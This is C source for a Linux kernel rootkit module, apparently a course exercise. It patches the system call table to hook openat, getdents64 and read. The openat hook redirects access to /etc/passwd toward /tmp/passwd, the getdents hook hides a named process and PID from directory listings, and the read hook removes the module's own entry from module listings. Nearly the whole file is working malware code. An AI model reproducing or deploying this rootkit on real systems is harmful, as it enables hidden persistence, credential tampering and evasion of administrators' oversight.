#include <asm/cacheflush.h>
#include <asm/current.h>  // process information
#include <asm/page.h>
#include <asm/unistd.h>     // for system call constants
#include <linux/highmem.h>  // for changing page permissions
#include <linux/init.h>     // for entry/exit macros
#include <linux/kallsyms.h>
#include <linux/kernel.h>  // for printk and other kernel bits
#include <linux/module.h>  // for all modules
#include <linux/sched.h>
#include <linux/dirent.h>

// This is a pointer to the system call table
static unsigned long * sys_call_table;

MODULE_LICENSE("GPL");
#define PREFIX "sneaky_process"

static char * sneaky_pid = "";
module_param(sneaky_pid, charp, 0);
MODULE_PARM_DESC(sneaky_pid, "sneaky_pid");


// Helper functions, turn on and off the PTE address protection mode
// for syscall_table pointer
int enable_page_rw(void * ptr) {
  unsigned int level;
  pte_t * pte = lookup_address((unsigned long)ptr, &level);
  if (pte->pte & ~_PAGE_RW) {
    pte->pte |= _PAGE_RW;
  }
  return 0;
}

int disable_page_rw(void * ptr) {
  unsigned int level;
  pte_t * pte = lookup_address((unsigned long)ptr, &level);
  pte->pte = pte->pte & ~_PAGE_RW;
  return 0;
}

//-----------open-------------------
// 1. Function pointer will be used to save address of the original 'openat' syscall.
// 2. The asmlinkage keyword is a GCC #define that indicates this function
//    should expect it find its arguments on the stack (not in registers).
asmlinkage int (*original_openat)(struct pt_regs *);

// Define your new sneaky version of the 'openat' syscall
asmlinkage int sneaky_sys_openat(struct pt_regs * regs) {
  if (strstr(regs->si, "/etc/passwd") != NULL) {
    // if (sig)
    // printk(KERN_INFO "change to sneaky_sys_openat\n");
    copy_to_user((void *)regs->si, "/tmp/passwd", strlen("/tmp/passwd"));
  }
  return (*original_openat)(regs);
}

//------------getdents64------------//
asmlinkage int (*original_getdents)(struct pt_regs *);

asmlinkage int sneaky_sys_getdents(struct pt_regs * regs) {
  struct linux_dirent64 * d=NULL;
  int nget, bpos;
  //  printk(KERN_INFO "getting into sneaky_sys_getdents\n");

  nget = original_getdents(regs);
  if (nget == -1||nget==0) {
    return nget;
  }

  bpos=0;
  while (bpos<nget) {
    d = (struct linux_dirent64 *)((char*)regs->si + bpos);
    if ((strcmp(d->d_name,PREFIX ) == 0) ||
        (strcmp(d->d_name, sneaky_pid) == 0)) {
      // printk(KERN_INFO "find sneaky_process or sneaky_pid");
      memmove((char*)regs->si + bpos, (char*)regs->si + bpos+ d->d_reclen, nget - (bpos + d->d_reclen));
      nget -= d->d_reclen;
    }
    else {
      bpos += d->d_reclen;
    }
  }
  return nget;
}


//--------read-----------//
asmlinkage ssize_t (*original_read)(struct pt_regs * );

asmlinkage ssize_t sneaky_sys_read(struct pt_regs * regs) {
  ssize_t nread;
  char *line_start, *line_end;
  // printk(KERN_INFO "getting into sneaky_sys_read\n");

  line_start = NULL;
  line_end = NULL;
  nread = original_read(regs);
  if (nread == -1||nread == 0) {
    return nread;
  }

  line_start = strstr((void*)regs->si, "sneaky_mod ");
  if (line_start != NULL) {
    line_end = strchr(line_start, '\n');
    if(line_end !=NULL){
      line_end++;
      memmove(line_start, line_end, (char __user*)(regs->si )+ nread - line_end);
      nread -= (ssize_t)(line_end - line_start);
    }
  }
  return nread;
}

// The code that gets executed when the module is loaded
static int initialize_sneaky_module(void) {
  // See /var/log/syslog or use `dmesg` for kernel print output
  // printk(KERN_INFO "Sneaky module being loaded.\n");

  // Lookup the address for this symbol. Returns 0 if not found.
  // This address will change after rebooting due to protection
  sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");

  // This is the magic! Save away the original 'openat' system call
  // function address. Then overwrite its address in the system call
  // table with the function address of our new code.
  original_openat = (void *)sys_call_table[__NR_openat];
  original_getdents = (void *)sys_call_table[__NR_getdents64];
  original_read = (void *)sys_call_table[__NR_read];

  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);

  sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
  sys_call_table[__NR_getdents64] = (unsigned long)sneaky_sys_getdents;
  sys_call_table[__NR_read] = (unsigned long)sneaky_sys_read;

  // You need to replace other system calls you need to hack here

  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);

  return 0;  // to show a successful load
}

static void exit_sneaky_module(void) {
  // printk(KERN_INFO "Sneaky module being unloaded.\n");

  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);

  // This is more magic! Restore the original 'open' system call
  // function address. Will look like malicious code was never there!
  sys_call_table[__NR_openat] = (unsigned long)original_openat;
  sys_call_table[__NR_getdents64] = (unsigned long)original_getdents;
  sys_call_table[__NR_read] = (unsigned long)original_read;

  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);
}

module_init(initialize_sneaky_module);  // what's called upon loading
module_exit(exit_sneaky_module);        // what's called upon unloading
